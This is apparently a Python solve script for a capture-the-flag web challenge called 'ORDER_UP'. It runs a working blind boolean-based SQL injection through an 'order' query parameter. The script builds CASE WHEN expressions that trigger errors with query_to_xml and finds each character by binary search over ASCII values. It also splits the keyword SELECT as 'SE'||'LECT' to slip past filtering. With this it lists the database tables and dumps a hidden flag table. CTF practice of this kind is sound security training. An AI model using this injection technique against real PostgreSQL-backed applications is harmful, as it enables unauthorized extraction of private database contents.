import os
import requests
import sys


# Note: This chal has per-team instances SO you have to spin up your instance
# and THEN set it here before.
URL = os.getenv('CHAL_URL') or 'https://dyn-svc-order-up-xzt52u0rhv6nh4eo2w0q-okntin33tq-uc.a.run.app/'
URL = URL + '/query'

def tryUrl(expression):
    order = f"CASE WHEN ({expression}) THEN item_name ELSE ''||query_to_xml('bad-query',true,true,'') END"
    params = {'col1': 'item_name', 'order': order}

    response = requests.get(URL, params=params, timeout=20)
    # print(response.status_code, response.text)

    return 'Error' not in response.text




def probeValueAtOffset(value, charOffset):

    lowGuessIndex = 1
    highGuessIndex = 126

    while lowGuessIndex < highGuessIndex:
        guessIndex = lowGuessIndex + (highGuessIndex - lowGuessIndex) // 2;

        expression = f"ascii(substring({value}, {charOffset}, 1)) >= {guessIndex}"
        # print(expression)

        if tryUrl(expression):
            if lowGuessIndex == guessIndex:
                return chr(guessIndex)
            lowGuessIndex = guessIndex
        else:
            highGuessIndex = guessIndex

    return False


def runQuery(expression):
    value = ''
    offset = len(value)
    while True:
        offset += 1
        nextChar = probeValueAtOffset(expression, offset)
        if not nextChar:
            return value
        value += nextChar
        print(value)

    return value



expression = """replace(replace(''||query_to_xml('SE'||'LECT table_name a FROM information_schema.tables where (table_schema=''public'')',true,true,''),'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"',''),'row','')"""
value1 = runQuery(expression)

if 'flag_table_542986521' in value1:
    print('FOUND flag2 table!')
else:
    print('FAILED to find flag2 table')
    sys.exit(1)


expression = """replace(replace(replace(''||query_to_xml('SE'||'LECT * FROM flag_table_542986521',true,true,''),'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"',''),'row',''),'value','')"""
value2 = runQuery(expression)
print('-------------------------------------')
if 'wctf{' in value2:
    print('SOLVED: ORDER_UP flag 2!')
else:
    print('FAILED to find flag2')

